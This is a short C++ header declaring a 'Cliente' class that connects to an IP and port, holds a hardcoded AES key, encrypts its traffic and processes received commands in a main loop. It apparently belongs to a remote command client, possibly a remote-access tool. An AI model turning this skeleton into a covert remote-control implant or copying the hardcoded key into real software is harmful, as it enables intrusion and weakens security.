#include "headers.hpp"

#ifndef _CLIENTE_H
#define _CLIENTE_H


class Cliente {
	private:
		SOCKET sckSocket = INVALID_SOCKET;
		unsigned char t_key[AES_KEY_LEN] = { 0x74, 0X48, 0X33, 0X2D, 0X4A, 0X5C, 0X2F, 0X61, 0X4E, 0X7C, 0X3C, 0X45, 0X72, 0X7B, 0X31, 0X33,
								  0X33, 0X37, 0X7D, 0X2E, 0X7E, 0X40, 0X69, 0X6C, 0X65, 0X72, 0X61, 0x25, 0x25, 0x5D, 0x00, 0x5E };
		ByteArray bKey;
		void Init_Key();
	public:
		Cliente();
		~Cliente();

		bool isRunning = true;
		//Sockets
		bool bConectar(const char* cIP, const char* cPuerto);
		void CerrarConexion();
		//Socket wraps
		int cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock = false);
		int cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool isBlock = false);

		ByteArray bDec(const unsigned char* pInput, size_t pLen);
		ByteArray bEnc(const unsigned char* pInput, size_t pLen);

		void iniPacket();

		void MainLoop();

		void ProcesarComando(std::vector<std::string> strIn);
};

#endif